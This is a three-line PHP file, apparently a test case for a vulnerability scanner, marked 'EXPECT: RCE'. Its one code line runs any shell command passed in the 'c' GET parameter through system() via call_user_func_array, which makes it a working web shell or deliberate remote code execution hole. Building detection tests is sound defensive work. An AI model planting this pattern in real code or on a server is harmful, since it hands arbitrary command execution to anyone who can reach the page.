<?php
// EXPECT: RCE
call_user_func_array('system', [$_GET['c']]);
